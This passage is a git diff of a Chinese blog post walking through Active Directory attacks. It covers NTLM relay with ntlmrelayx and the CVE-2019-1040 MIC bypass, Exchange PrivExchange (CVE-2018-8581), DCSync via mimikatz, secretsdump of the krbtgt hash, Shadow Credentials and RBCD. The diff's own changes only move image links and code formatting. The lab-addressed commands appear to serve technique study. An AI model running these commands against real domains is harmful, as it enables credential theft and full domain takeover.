         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/9O7JcSEbZAhvexN.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215113343-0zmelch.png"
         title="image.png" /></p>
 <p>mimikatz</p>
-<p><code>lsadump::dcsync /all</code></p>
-<h3 id="cred-dump">Cred Dump</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">lsadump::dcsync /all
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="cred-dump">Cred Dump</h3>
 <p>敬请期待</p>
 <p><a href="https://github.com/SecureAuthCorp/impacket/pull/1253" target="_blank" rel="noopener noreffer">https://github.com/SecureAuthCorp/impacket/pull/1253</a></p>
 <h3 id="exec">EXEC</h3>
-<p>python3 ntlmrelayx.py -t smb://10.10.10.15 &ndash;remove-mic -c whoami</p>
-<p><img
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -t smb://10.10.10.15 --remove-mic -c whoami
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png"
-        data-srcset="https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png, https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png 1.5x, https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png"
-        title="image-20220219230131789" /></p>
-<h3 id="枚举域内信息">枚举域内信息</h3>
-<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug &ndash;dump-laps &ndash;dump-gmsa &ndash;remove-mic<img
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219230123-oqwtqjn.png"
+        title="image.png" /></p>
+<h3 id="枚举信息">枚举信息</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png"
-        data-srcset="https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png, https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png 1.5x, https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png"
-        title="image-20220219230609579" /></p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png"
-        data-srcset="https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png, https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png 1.5x, https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png 2x"
-        data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png"
-        title="image-20220219230750303" /></p>
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219231301-lkb12xc.png"
+        title="image.png" /></p>
 <h3 id="创建用户ldaps">创建用户（LDAPS）</h3>
 <ol>
 <li><strong>添加机器账户</strong>：</li>
@@ -491,78 +527,115 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png"
-        data-srcset="https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png, https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png 1.5x, https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png"
-        title="image-20220219234336853" /></p>
-<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 &ndash;add-computer testpc$ &ndash;remove-mic</p>
-<p><img
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219233947-j2x8khq.png"
+        title="image.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png"
-        data-srcset="https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png, https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png 1.5x, https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png"
-        title="image-20220219234418973" /></p>
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png"
+        title="image.png" /></p>
 <ol start="2">
 <li><strong>添加普通用户</strong></li>
 </ol>
 <p>需要高权限账户（比如说域管）才可以，</p>
-<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 &ndash;remove-mic</p>
-<p><img
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png"
-        data-srcset="https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png, https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png 1.5x, https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png"
-        title="image-20220219234738893" /></p>
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png"
+        title="image.png" /></p>
 <h3 id="exchange">Exchange</h3>
 <p><strong>存在CVE-2019-1040漏洞的情况下，可以从SMB-&gt;LDAP(s)。而无需考虑签名的情况。</strong></p>
-<p>Exchange的机器账户是域内的高权限账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：</p>
+<p>Exchange的机器账户是域内高权账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：</p>
 <ul>
 <li>复制目录更改</li>
 <li>复制目录更改所有项</li>
 </ul>
 <p>这样该用户就具备了Dcsync权限，从而可以导出域内所有用户Hash。</p>
 <p>当exchange存在SSRF漏洞(<a href="https://github.com/dirkjanm/PrivExchange" target="_blank" rel="noopener noreffer">CVE-2018-8581</a>)时。可触发http类型的NTLM认证。不需要考虑签名问题。</p>
-<p>python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123  10.10.10.21</p>
-<p><strong>等待一分钟</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 privexchange.py -d ddc.com -u test1 -p song@2020 -ah 10.10.10.123  10.10.10.21
+</code></pre></td></tr></table>
+</div>
+</div><p><strong>等待一分钟</strong></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png"
-        data-srcset="https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png, https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png 1.5x, https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/qfFKaDJrto3ZgwG.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170012-z0eknwi.png"
         title="image.png" /></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png"
-        data-srcset="https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png, https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png 1.5x, https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/vqLZwmxanAtbJhl.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217170234-76xooxz.png"
         title="image.png" /></p>
 <p>没有SSRF时，可通过触发SMB类型流量结合CVE-2019-1040移除MIC完整型检验.</p>
-<p>python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug &ndash;escalate-user wukong &ndash;remove-mic</p>
-<p><img
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --escalate-user wukong --remove-mic
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png"
-        data-srcset="https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png, https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png 1.5x, https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/r1wNWCxpZ7An3Ri.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192302-hbl2q2j.png"
         title="image.png" /></p>
-<p>python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt</p>
-<p><img
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -debug -just-dc-user krbtgt
+
+</code></pre></td></tr></table>
+</div>
+</div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png"
-        data-srcset="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png, https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png 1.5x, https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png"
         title="image.png" /></p>
 <h3 id="影子凭证shadow-credentials">影子凭证（Shadow Credentials）</h3>
 <ol>
@@ -574,24 +647,24 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <blockquote>
 <p>Microsoft 还引入了密钥信任的概念，以在不支持证书信任的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。</p>
 </blockquote>
-<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png" title="image.png" data-thumbnail="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png" title="image.png" data-thumbnail="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png"
-            data-srcset="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png, https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png 1.5x, https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png 2x"
+            data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png"
+            data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png 2x"
             data-sizes="auto"
-            alt="https://s2.loli.net/2022/02/18/cDO9ilkvLaPUsZj.png" />
+            alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110700-yj804r4.png" />
     </a><figcaption class="image-caption">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</figcaption>
     </figure></p>
-<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png" title="image.png" data-thumbnail="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png" title="image.png" data-thumbnail="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png"
-            data-srcset="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png, https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png 1.5x, https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png 2x"
+            data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png"
+            data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png 2x"
             data-sizes="auto"
-            alt="https://s2.loli.net/2022/02/18/XjLAk83Bexa4VFI.png" />
+            alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218110707-p1uunbf.png" />
     </a><figcaption class="image-caption">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</figcaption>
     </figure></p>
 <p>简单来说就是客户端有自己的一对密钥，KDC也存着用户的公钥。使用私钥加密预认证信息发给KDC，KDC使用用户的公钥解密，验证通过返回TGT。</p>
@@ -613,45 +686,47 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 </div><p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png"
-        data-srcset="https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png, https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png 1.5x, https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/b9YHVokUEy7K1n4.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145731-unvrfbi.png"
         title="image.png" /></p>
-<p>第一次大概率会遇到下面的错误。需要去域控上注册证书。<a href="https://support.citrix.com/article/CTX218941" target="_blank" rel="noopener noreffer">FAS - Request not supported while launching a published Desktop with FAS</a></p>
+<p>第一次大概率会遇到下面的错误。需要去域控上注册证书。</p>
+<p><a href="https://support.citrix.com/article/CTX218941" target="_blank" rel="noopener noreffer">FAS - Request not supported while launching a published Desktop with FAS</a></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png"
-        data-srcset="https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png, https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png 1.5x, https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/gwQfedTVmyY8CnR.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218145622-2sqt1ax.png"
         title="image.png" /></p>
 <p><strong>获取hash</strong>：原理看下面这段话</p>
-<p><figure><a class="lightgallery" href="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png" title="image.png" data-thumbnail="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
+<p><figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png" title="image.png" data-thumbnail="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png" data-sub-html="<h2>https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</h2><p>image.png</p>">
         <img
             class="lazyload"
             src="/svg/loading.min.svg"
-            data-src="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png"
-            data-srcset="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png, https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png 1.5x, https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png 2x"
+            data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png"
+            data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png 2x"
             data-sizes="auto"
-            alt="https://s2.loli.net/2022/02/18/rqlSaKJFfkBGso3.png" />
+            alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218151126-ac7lk8x.png" />
     </a><figcaption class="image-caption">https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab</figcaption>
     </figure></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
-        data-src="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png"
-        data-srcset="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png, https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png 1.5x, https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png 2x"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png 2x"
         data-sizes="auto"
-        alt="https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png"
         title="image.png" /></p>
 <ol start="2">
-<li>结合NTLM Relay</li>
+<li><strong>结合NTLM Relay</strong></li>
 </ol>
 <p><a href="https://github.com/SecureAuthCorp/impacket/pull/1249" target="_blank" rel="noopener noreffer">https://github.com/SecureAuthCorp/impacket/pull/1249</a></p>
 <blockquote>
-<p>用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。<a href="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials" target="_blank" rel="noopener noreffer">Shadow Credentials - The Hacker Recipes</a></p>
+<p>用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。<br>
+计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。</p>
 </blockquote>
 <h3 id="rbcd低权限">RBCD（低权限）</h3>
 <p>当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。</p>
@@ -661,7 +736,6 @@ Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.10.10.15
 <p><a href="https://mp.weixin.qq.com/s?__biz=MzUzNTEyMTE0Mw==&amp;mid=2247484864&amp;idx=1&amp;sn=94260cb4a4e643764f4cfd3565ae799b" target="_blank" rel="noopener noreffer">[域渗透] SQLSERVER 结合中继与委派</a></p>
 <p><a href="https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ" target="_blank" rel="noopener noreffer">安全研究 | 使用PetitPotam代替Printerbug</a></p>
 <p><a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" target="_blank" rel="noopener noreffer">Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members</a></p>
-<p><a href="https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials" target="_blank" rel="noopener noreffer">Shadow Credentials - The Hacker Recipes</a></p>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
